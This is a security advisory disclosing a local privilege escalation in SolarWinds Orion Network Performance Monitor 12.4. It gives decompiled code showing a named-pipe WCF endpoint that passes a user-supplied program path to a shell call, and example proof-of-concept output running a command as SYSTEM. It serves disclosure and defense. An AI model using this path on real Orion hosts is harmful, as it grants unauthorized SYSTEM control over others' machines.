# SolarWinds Orion Network Performance Monitor ExecuteExternalProgram Privilege Escalation (ZDI-19-687)

March 20, 2019

## Tested Versions:

SolarWinds Orion Network Performance Monitor 12.4 (Evaluation) on Windows Server 2016 x64, .NET 4.7.2
Download: https://downloads.solarwinds.com/solarwinds/OfflineInstallers/RTM/NPM/Solarwinds-Orion-NPM-12.4-Eval-OfflineInstaller.exe

## Vulnerability Details:

SolarWinds Orion Network Performance Monitor (NPM) is network monitoring software designed to reduce
network outages and improve performance. It is used to provide monitoring, alerting, reporting, and basic
management of a network. Upon installation, the application deploys multiple services, namely the SolarWinds
Orion Module Engine service hosted in the SolarWinds.BusinessLayerHost.exe process. This service exposes
many locally and remotely accessible endpoints used by other components of the application to perform core tasks.

The SolarWinds Orion Module Engine service is built using the Windows Communication Foundation (WCF)
framework. WCF is a framework for building service-oriented applications revolving around three main concepts - 
addresses, bindings, and contracts. These are well explained here: 
https://docs.microsoft.com/en-us/dotnet/framework/wcf/fundamental-concepts

An elevation of privilege vulnerability exists in SolarWinds Orion Network Performance Monitor. The SolarWinds
Orion Module Engine service registers a locally accessible WCF endpoint with a named pipe binding at the
following address:

`net.pipe://localhost/orion/core/businesslayer`

Accessible at this endpoint is the "CoreBusinessLayer" service contract which is outlined by the ICoreBusinessLayer
interface:

SolarWinds.Orion.Core.Common.dll:
```csharp
namespace SolarWinds.Orion.Core.Common
{
  [ServiceContract(Name = "CoreBusinessLayer", Namespace = "http://schemas.solarwinds.com/2008/Core")]
  [Audit]
  [Hubble]
  [I18N]
  public interface ICoreBusinessLayer : IDisposable
  {
     ...
     [OperationContract(Name = "InvokeActionMethod")]
     [NetDataContractFormat]
     [FaultContract(typeof(CoreFaultContract))]
     string InvokeActionMethod(string actionTypeID, string methodName, string args);
     ...
 }
}
```
In this service contract is the "InvokeActionMethod" operation contract which allows you to invoke certain 'actions' and 
'methods', namely "ExecuteExternalProgram". If a low privilege user runs a WCF client that creates a channel to the above 
endpoint then calls InvokeActionMethod with an actionTypeID of "ExecuteExternalProgram" and methodName of "ValidateAccess", 
InvokeMethod() in the following code will be called:

SolarWinds.Orion.Core.Actions.dll:
```csharp
namespace SolarWinds.Orion.Core.Actions.Impl.ExecuteExternalProgram {
  [Export(typeof(IActionMethodInvoker))]
  internal class ExecuteExternalProgramInvoker: IActionMethodInvoker, IAction {
   ...
   public string InvokeMethod(string methodName, string args) {
    if (methodName == "ValidateAccess") {
     // parse provided args as ExecuteExternalProgramConfiguration
     ExecuteExternalProgramConfiguration config =
        SerializationHelper.FromXmlString<ExecuteExternalProgramConfiguration>(args);
     return SerializationHelper.ToXmlString(this.ValidateAccessToFile(config), new Type[] {
        typeof(bool)
     });
    }
    ...
   }

   private bool ValidateAccessToFile(ExecuteExternalProgramConfiguration config) {
    try {
     if (config.Credentials == null) {
      // ProgramPath in config is user controlled
      if (!this.ExecuteWithoutCredentials(config.ProgramPath)) {
       return false;
      }
     } else {
      ...
     }
    }
    ...
   }
   
   private bool ExecuteWithoutCredentials(string filename) {
     // arbitrary code execution with user-provided separameter
     return Interaction.Shell(filename, AppWinStyle.Hide, false, 120000) > 0;
   }
    ...
  }
}
```
The `args` parameter will be parsed as a serialized `ExecuteExternalProgramConfiguration` and its `ProgramPath` property 
passed directly to `Interaction.Shell` resulting in arbitrary code execution as NT AUTHORITY\SYSTEM. A low privilege user 
can use this to elevate privileges to SYSTEM.

## Remediation:

The application must secure named pipes to ensure that low privileged users are unable to access privileged endpoints.

## Proof of Concept:

A proof-of-concept, orion.exe (compiled from orion.cs), has been provided to demonstrate the impact 
of the vulnerability. It expects the following syntax:

`orion.exe <command>`

Upon executing orion.exe with a provided command, the command will be executed as NT AUTHORITY\SYSTEM by the Orion 
Module Engine service (SolarWinds.BusinessLayerHost.exe). 

Example output:
```
C:\Users\low_priv\Desktop\poc>orion.exe "cmd.exe /c whoami > C:\Users\low_priv\Desktop\poc\priv.txt"

[i] Address: net.pipe://localhost/orion/core/businesslayer
[i] Creating ChannelFactory<ICoreBusinessLayer>...
[i] Creating channel to address...
[i] Executing InvokeActionMethod("ExecuteExternalProgram")...
[i] Success! Output: <boolean xmlns="http://schemas.microsoft.com/2003/10/Serialization/">true</boolean>

C:\Users\low_priv\Desktop\poc>type priv.txt
nt authority\system

C:\Users\low_priv\Desktop\poc>whoami
win-ndrt3c7lrir\low_priv
```
## Shoutouts

Fabius Watson and his excellent WCF research (https://versprite.com/author/fabius-watson/)
